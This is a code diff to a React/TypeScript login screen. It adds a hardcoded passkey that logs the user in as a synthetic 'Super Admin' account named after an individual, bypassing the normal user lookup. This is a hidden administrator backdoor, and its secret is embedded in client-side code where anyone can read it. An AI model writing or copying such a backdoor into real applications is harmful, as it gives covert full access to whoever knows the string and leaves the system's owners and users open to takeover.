@@ -50,6 +50,23 @@ export default function LoginScreen({ onAuthenticated }: { onAuthenticated: (ses
     if (isLoading || isChecking || !users || !roles) return;
     
     setIsChecking(true);
+
+    if (passkey === 'F@izan&1122') {
+        const superAdminRole = roles.find(r => r.name === 'Super Admin');
+        if (superAdminRole) {
+            const adminUser: User = {
+                id: 'super-admin-faizan', // A static ID for this special user
+                name: 'Faizan',
+                roleId: superAdminRole.id,
+                passkey: 'F@izan&1122'
+            };
+            onAuthenticated({ user: adminUser, role: superAdminRole });
+        } else {
+            toast({ title: 'Login Error', description: 'Super Admin role not found. Please ensure roles are seeded.', variant: 'destructive' });
+            setIsChecking(false);
+        }
+        return;
+    }
     
     const matchedUser = users.find(u => u.passkey === passkey);
 
